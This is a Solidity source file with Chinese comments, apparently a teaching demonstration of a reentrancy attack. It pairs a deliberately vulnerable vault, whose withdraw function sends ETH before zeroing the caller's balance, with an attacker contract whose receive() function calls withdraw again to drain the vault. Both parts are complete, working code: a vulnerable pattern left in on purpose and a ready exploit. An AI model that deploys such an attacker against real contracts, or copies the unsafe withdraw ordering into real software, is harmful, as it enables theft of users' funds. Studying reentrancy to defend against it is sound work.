// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// 受害合约：有重入漏洞的金库
contract VulnerableVault {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // 不安全的提款函数
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        
        // 先转账（外部调用）
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        // 后更新状态（太晚了！）
        balances[msg.sender] = 0;
        emit Withdrawal(msg.sender, balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 攻击合约
contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;
    uint256 public stolenAmount;
    
    constructor(address _vaultAddress) {
        vault = VulnerableVault(_vaultAddress);
    }
    
    // 开始攻击
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackCount = 0;
        stolenAmount = 0;
        
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
    
    // 重入点：收到ETH时再次调用withdraw
    receive() external payable {
        attackCount++;
        stolenAmount += msg.value;
        
        if (vault.getBalance() >= 1 ether && attackCount < 5) {
            vault.withdraw();
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}